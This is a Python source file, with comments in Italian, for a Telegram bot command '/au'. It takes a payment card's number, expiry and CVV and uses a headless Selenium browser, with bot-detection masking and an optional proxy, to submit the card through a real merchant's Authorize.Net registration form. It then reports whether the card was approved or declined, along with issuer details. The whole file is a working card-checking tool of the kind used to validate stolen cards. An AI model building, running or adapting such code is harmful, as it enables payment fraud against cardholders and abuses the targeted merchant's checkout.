import re
import logging
import random
import string
import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.action_chains import ActionChains
from selenium.common.exceptions import TimeoutException, NoSuchElementException
from telegram import Update
from telegram.ext import ContextTypes

from card_parser import parse_card_input
from security import is_allowed_chat, get_chat_permissions, can_use_command
from api_client import api_client

logger = logging.getLogger(__name__)

def run_authnet_check(card_number, month, year, cvv, proxy_url=None):
    """
    Execute payment test on AuthNet Gate - VERSIONE MIGLIORATA
    """
    driver = None
    try:
        chrome_options = Options()
        chrome_options.add_argument("--headless")
        chrome_options.add_argument("--no-sandbox")
        chrome_options.add_argument("--disable-dev-shm-usage")
        chrome_options.add_argument("--disable-blink-features=AutomationControlled")
        chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
        chrome_options.add_experimental_option('useAutomationExtension', False)
        
        chrome_options.add_argument("--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
        chrome_options.add_argument("--window-size=1920,1080")
        
        if proxy_url:
            chrome_options.add_argument(f'--proxy-server={proxy_url}')
        
        driver = webdriver.Chrome(options=chrome_options)
        wait = WebDriverWait(driver, 25)
        
        driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
        
        print("🔄 Accessing AuthNet registration...")
        driver.get("https://tempestprotraining.com/register/")
        time.sleep(7)  # Più tempo per il caricamento
        
        # DEBUG avanzato
        print("🔍 Page title:", driver.title)
        print("🔍 Current URL:", driver.current_url)
        
        # SCROLL per attivare eventuali script
        driver.execute_script("window.scrollTo(0, document.body.scrollHeight);")
        time.sleep(2)
        driver.execute_script("window.scrollTo(0, 0);")
        time.sleep(2)
        
        # CERCA IFRAME PER PAGAMENTI (comune in AuthNet)
        iframes = driver.find_elements(By.TAG_NAME, "iframe")
        print(f"🔍 Iframes trovati: {len(iframes)}")
        
        for i, iframe in enumerate(iframes):
            try:
                iframe_src = iframe.get_attribute('src') or iframe.get_attribute('data-src')
                print(f"  Iframe {i}: {iframe_src}")
            except:
                pass
        
        # APPROCCIO PIÙ ROBUSTO PER TROVARE I CAMPI
        def find_and_fill_field(selectors, value, field_type="text"):
            """Cerca un campo con multiple strategie e lo compila"""
            for selector_type, selector in selectors:
                try:
                    if selector_type == "id":
                        element = driver.find_element(By.ID, selector)
                    elif selector_type == "name":
                        element = driver.find_element(By.NAME, selector)
                    elif selector_type == "css":
                        element = driver.find_element(By.CSS_SELECTOR, selector)
                    elif selector_type == "xpath":
                        element = driver.find_element(By.XPATH, selector)
                    else:
                        continue
                    
                    # Scroll to element
                    driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", element)
                    time.sleep(1)
                    
                    # Clear and fill
                    element.clear()
                    
                    # Simula digitazione umana per campi sensibili
                    if field_type == "card":
                        for char in value:
                            element.send_keys(char)
                            time.sleep(0.05)
                    else:
                        element.send_keys(value)
                    
                    print(f"✅ Campo {selector} compilato")
                    return True
                    
                except NoSuchElementException:
                    continue
                except Exception as e:
                    print(f"⚠️ Errore compilazione {selector}: {e}")
                    continue
            return False
        
        # COMPILAZIONE USERNAME
        username_selectors = [
            ("id", "user_login"),
            ("name", "user_login"),
            ("css", "input[type='text'][name*='user']"),
            ("xpath", "//input[contains(@name, 'login')]")
        ]
        username = ''.join(random.choices(string.ascii_lowercase, k=8))
        find_and_fill_field(username_selectors, username, "text")
        
        # COMPILAZIONE EMAIL
        email_selectors = [
            ("id", "user_email"),
            ("name", "user_email"),
            ("css", "input[type='email']"),
            ("xpath", "//input[@type='email']")
        ]
        email = f"test{random.randint(1000,9999)}@gmail.com"
        find_and_fill_field(email_selectors, email, "text")
        
        # COMPILAZIONE PASSWORD
        password_selectors = [
            ("id", "user_pass"),
            ("name", "user_pass"),
            ("css", "input[type='password']"),
            ("xpath", "//input[@type='password']")
        ]
        find_and_fill_field(password_selectors, "TestPassword123!", "text")
        
        # COMPILAZIONE CARD NUMBER - APPROCCIO SPECIALE
        print("🔍 Cercando campo card number...")
        card_selectors = [
            ("name", "authorize_net[card_number]"),
            ("name", "card_number"),
            ("name", "cardNumber"),
            ("css", "input[data-authorize-net='card-number']"),
            ("css", "input[placeholder*='card']"),
            ("xpath", "//input[contains(@name, 'card')]"),
            ("xpath", "//input[contains(@placeholder, 'Card')]")
        ]
        
        if not find_and_fill_field(card_selectors, card_number, "card"):
            print("❌ Campo card number non trovato - provo iframe...")
            # PROVA IN IFRAME
            for iframe in iframes:
                try:
                    driver.switch_to.frame(iframe)
                    if find_and_fill_field(card_selectors, card_number, "card"):
                        print("✅ Card number compilato in iframe")
                        driver.switch_to.default_content()
                        break
                    driver.switch_to.default_content()
                except:
                    driver.switch_to.default_content()
        
        # COMPILAZIONE EXPIRY MONTH
        month_selectors = [
            ("name", "authorize_net[exp_month]"),
            ("name", "exp_month"),
            ("name", "expMonth"),
            ("css", "select[name*='month']"),
            ("css", "input[placeholder*='MM']")
        ]
        find_and_fill_field(month_selectors, month, "text")
        
        # COMPILAZIONE EXPIRY YEAR
        year_selectors = [
            ("name", "authorize_net[exp_year]"),
            ("name", "exp_year"),
            ("name", "expYear"),
            ("css", "select[name*='year']"),
            ("css", "input[placeholder*='YY']")
        ]
        find_and_fill_field(year_selectors, year, "text")
        
        # COMPILAZIONE CVV
        cvv_selectors = [
            ("name", "authorize_net[cvc]"),
            ("name", "cvc"),
            ("name", "cvv"),
            ("css", "input[placeholder*='CVV']"),
            ("css", "input[placeholder*='cvc']")
        ]
        find_and_fill_field(cvv_selectors, cvv, "text")
        
        # TERMS CHECKBOX
        try:
            terms_selectors = [
                ("name", "terms"),
                ("css", "input[type='checkbox'][name*='terms']"),
                ("xpath", "//input[@type='checkbox' and contains(@name, 'terms')]")
            ]
            
            for selector_type, selector in terms_selectors:
                try:
                    if selector_type == "name":
                        checkbox = driver.find_element(By.NAME, selector)
                    elif selector_type == "css":
                        checkbox = driver.find_element(By.CSS_SELECTOR, selector)
                    elif selector_type == "xpath":
                        checkbox = driver.find_element(By.XPATH, selector)
                    
                    if not checkbox.is_selected():
                        driver.execute_script("arguments[0].click();", checkbox)
                        print("✅ Terms checkbox selezionato")
                        break
                except:
                    continue
        except Exception as e:
            print(f"⚠️ Terms checkbox non trovato: {e}")
        
        time.sleep(3)
        
        # SUBMIT MIGLIORATO
        print("🔍 Cercando bottone submit...")
        submitted = False
        
        # Lista di selettori per submit button
        submit_selectors = [
            ("css", "button[type='submit']"),
            ("css", "input[type='submit']"),
            ("css", ".btn-primary"),
            ("css", ".submit-btn"),
            ("css", ".register-btn"),
            ("xpath", "//button[contains(text(), 'Register')]"),
            ("xpath", "//button[contains(text(), 'Sign Up')]"),
            ("xpath", "//input[@value='Register']"),
            ("xpath", "//input[@value='Sign Up']")
        ]
        
        for selector_type, selector in submit_selectors:
            try:
                if selector_type == "css":
                    buttons = driver.find_elements(By.CSS_SELECTOR, selector)
                elif selector_type == "xpath":
                    buttons = driver.find_elements(By.XPATH, selector)
                
                for btn in buttons:
                    try:
                        if btn.is_displayed() and btn.is_enabled():
                            print(f"✅ Trovato submit: {selector}")
                            driver.execute_script("arguments[0].scrollIntoView(true);", btn)
                            time.sleep(2)
                            
                            # Prova click JavaScript prima
                            driver.execute_script("arguments[0].click();", btn)
                            print("✅ Form inviato con JavaScript!")
                            submitted = True
                            time.sleep(5)
                            break
                    except:
                        continue
                if submitted:
                    break
            except Exception as e:
                print(f"⚠️ Errore con selector {selector}: {e}")
        
        if not submitted:
            print("❌ IMPOSSIBILE TROVARE BOTTONE SUBMIT - provo form submit")
            try:
                forms = driver.find_elements(By.TAG_NAME, "form")
                for form in forms:
                    try:
                        driver.execute_script("arguments[0].submit();", form)
                        print("✅ Form inviato via JavaScript")
                        submitted = True
                        break
                    except:
                        continue
            except Exception as e:
                print(f"❌ Errore form submit: {e}")
        
        print("🔄 Processing payment...")
        time.sleep(20)  # Più tempo per il processing
        
        # ANALISI RISULTATO MIGLIORATA
        current_url = driver.current_url.lower()
        page_text = driver.page_source.lower()
        page_title = driver.title.lower()
        
        print(f"📄 Final URL: {current_url}")
        print(f"📄 Page title: {page_title}")
        
        # CONTROLLA SUCCESSO - CRITERI PIÙ AMPI
        success_indicators = [
            'my-account' in current_url,
            'dashboard' in current_url,
            'thank you' in page_text,
            'welcome' in page_text,
            'success' in page_text,
            'registration complete' in page_text,
            'payment successful' in page_text,
            'congratulations' in page_text
        ]
        
        # CONTROLLA FALLIMENTO
        failure_indicators = [
            'declined' in page_text,
            'error' in page_text,
            'invalid' in page_text,
            'failed' in page_text,
            'try again' in page_text,
            'not processed' in page_text
        ]
        
        if any(success_indicators):
            print("✅ SUCCESSO - Indicatori di successo trovati")
            return "APPROVED", "Payment successful - Account created"
        
        elif any(failure_indicators):
            print("❌ DECLINED - Indicatori di errore trovati")
            return "DECLINED", "Payment failed - Error detected"
        
        # CONTROLLA SE SIAMO SU UNA PAGINA DIVERSA (successo implicito)
        elif 'register' not in current_url and 'tempestprotraining.com' in current_url:
            print("✅ SUCCESSO - Reindirizzamento a pagina diversa")
            return "APPROVED", "Payment processed successfully"
        
        # SE SIAMO ANCORA IN REGISTRATION
        elif 'register' in current_url:
            print("❌ DECLINED - Ancora in pagina di registrazione")
            return "DECLINED", "Payment failed - No redirect occurred"
        
        else:
            print("⚠️ RISULTATO INCERTO - Controllo elementi pagina")
            # Controlla se ci sono messaggi di errore visibili
            try:
                error_elements = driver.find_elements(By.CSS_SELECTOR, ".error, .alert-danger, .warning, .notice-error")
                if error_elements:
                    error_text = error_elements[0].text.lower()
                    print(f"❌ Trovato errore: {error_text}")
                    return "DECLINED", f"Payment failed - {error_text[:100]}"
            except:
                pass
            
            # Default a declined per sicurezza
            print("❌ DECLINED - Nessun indicatore chiaro di successo")
            return "DECLINED", "Payment failed - No clear success indicators"
                
    except Exception as e:
        print(f"❌ Error during test: {e}")
        return "ERROR", str(e)
    finally:
        if driver:
            driver.quit()

async def authnet_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check card with AuthNet Gate - VERSIONE MIGLIORATA"""
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    chat_type = update.effective_chat.type
    
    if not is_allowed_chat(chat_id, chat_type, user_id):
        permission_info = get_chat_permissions(chat_id, chat_type, user_id)
        await update.message.reply_text(f"❌ {permission_info}")
        return
    
    can_use, error_msg = can_use_command(user_id, 'au')
    if not can_use:
        await update.message.reply_text(error_msg)
        return
    
    if not context.args:
        await update.message.reply_text("Usage: /au number|month|year|cvv [proxy]")
        return
    
    full_input = ' '.join(context.args)
    proxy_match = re.search(r'(https?://[^\s]+)', full_input)
    proxy_url = proxy_match.group(0) if proxy_match else None
    
    if proxy_url:
        card_input = full_input.replace(proxy_url, '').strip()
    else:
        card_input = full_input
    
    card_input = re.sub(r'\s+', ' ', card_input).strip()
    
    wait_message = await update.message.reply_text("🔄 Checking AuthNet Gateway...")
    
    try:
        parsed_card = parse_card_input(card_input)
        
        if not parsed_card['valid']:
            await wait_message.edit_text(f"❌ Invalid card: {parsed_card['error']}")
            return
        
        bin_number = parsed_card['number'][:6]
        bin_result = api_client.bin_lookup(bin_number)
        
        # Aggiungi indicatori di processing
        await wait_message.edit_text("🔄 Processing card on AuthNet...")
        
        status, message = run_authnet_check(
            parsed_card['number'],
            parsed_card['month'],
            parsed_card['year'],
            parsed_card['cvv'],
            proxy_url=proxy_url
        )
        
        # Formatta la risposta
        card_display = f"{parsed_card['number']}|{parsed_card['month']}|{parsed_card['year']}|{parsed_card['cvv']}"
        
        if status == "APPROVED":
            response = f"""✅ *APPROVED* ✅

*Card:* `{card_display}`
*Gateway:* AuthNet $32
*Response:* {message}"""
        
        elif status == "DECLINED":
            response = f"""❌ *DECLINED* ❌

*Card:* `{card_display}`
*Gateway:* AuthNet $32  
*Response:* {message}"""
        
        else:
            response = f"""⚠️ *ERROR* ⚠️

*Card:* `{card_display}`
*Gateway:* AuthNet $32
*Response:* {message}"""
        
        # Aggiungi BIN info se disponibile
        if bin_result and bin_result['success']:
            bin_data = bin_result['data']
            response += f"""

*BIN Info:*
*Country:* {bin_data.get('country', 'N/A')}
*Issuer:* {bin_data.get('issuer', 'N/A')}
*Scheme:* {bin_data.get('scheme', 'N/A')}
*Type:* {bin_data.get('type', 'N/A')}
*Tier:* {bin_data.get('tier', 'N/A')}"""
        
        await wait_message.edit_text(response, parse_mode='Markdown')
        
    except Exception as e:
        logger.error(f"❌ Error in authnet_command: {e}")
        await wait_message.edit_text(f"❌ Error processing card: {str(e)}")
